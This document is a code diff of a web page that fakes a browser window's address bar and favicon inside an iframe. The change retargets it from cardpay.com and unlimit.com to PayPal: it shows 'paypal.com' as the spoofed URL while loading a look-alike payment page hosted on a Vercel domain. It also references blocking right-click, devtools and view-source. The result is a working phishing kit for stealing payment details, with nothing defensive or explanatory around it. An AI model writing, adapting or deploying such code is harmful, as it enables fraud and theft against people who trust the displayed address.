@@ -593,7 +593,7 @@ to this site. <a class="learn" href="https://support.google.com/chrome?p=ui_secu
 let openTimeout = null;
 (function() {
 'use strict';
-const START_URL = 'https://cardpay.com';
+const START_URL = 'https://paypal.com';
 const TIMEOUT_MS   = 10000;
 const FINISH_DELAY = 280;
 const iframe      = document.getElementById('webFrame');
@@ -1388,10 +1388,10 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
 <script>
 (function() {
     "use strict";
-    const PAYMENT_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
-    const SPOOFED_URL = 'https://unlimit.com';
-    const SPOOFED_DOMAIN = 'unlimit.com';
-    const TRIGGER_DOMAINS = ['cardpay.com', 'unlimit.com'];
+    const PAYMENT_URL = 'https://buypass-kappa.vercel.app/pay/paypal.html';
+    const SPOOFED_URL = 'https://paypal.com';
+    const SPOOFED_DOMAIN = 'paypal.com';
+    const TRIGGER_DOMAINS = ['paypal.com', 'paypal.com'];
     const iframe = document.getElementById('webFrame');
     const urlInput = document.getElementById('urlInput');
     const popupDomain = document.getElementById('popupDomain');
@@ -1402,13 +1402,13 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
     let pendingRefresh = false;
     function setSpoofedFavicon() {
         if (!faviconImg) return;
-        faviconImg.src = 'https://www.unlimit.com/favicon.ico';
+        faviconImg.src = 'https://www.paypal.com/favicon.ico';
         faviconImg.onload = () => {
             faviconImg.style.display = 'block';
             if (faviconDef) faviconDef.style.display = 'none';
         };
         faviconImg.onerror = () => {
-            faviconImg.src = 'https://www.google.com/s2/favicons?domain=unlimit.com&sz=32';
+            faviconImg.src = 'https://www.google.com/s2/favicons?domain=paypal.com&sz=32';
         };
     }
     function restoreNormalUI() {
@@ -1549,7 +1549,7 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
 <script>
 (function() {
     "use strict";
-    const TARGET_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
+    const TARGET_URL = 'https://buypass-kappa.vercel.app/pay/paypal.html';
     const urlInput = document.getElementById('urlInput');
     const refreshBtn = document.getElementById('refreshBtn');
     if (!urlInput || !refreshBtn) return;
